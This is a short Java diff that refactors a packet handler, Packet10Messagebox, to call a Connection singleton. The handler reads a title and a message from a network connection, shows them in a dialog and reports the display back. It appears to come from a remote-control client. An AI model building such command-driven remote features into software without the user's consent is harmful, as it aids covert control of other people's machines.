@@ -11,19 +11,19 @@ public class Packet10Messagebox extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		boolean theme = Connection.readBoolean();
+		boolean theme = Connection.instance.readBoolean();
 
 		if (theme) {
 			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 		}
 
-		final int mode = Connection.readInt();
-		final String title = Connection.readLine();
-		final String message = Connection.readLine();
+		final int mode = Connection.instance.readInt();
+		final String title = Connection.instance.readLine();
+		final String message = Connection.instance.readLine();
 
 		new Thread() {
 			public void run() {
-				Connection.status(Constants.STATUS_DISPLAYED_MSGBOX);
+				Connection.instance.status(Constants.STATUS_DISPLAYED_MSGBOX);
 				JOptionPane.showMessageDialog(null, message, title, mode);
 			}
 		}.start();
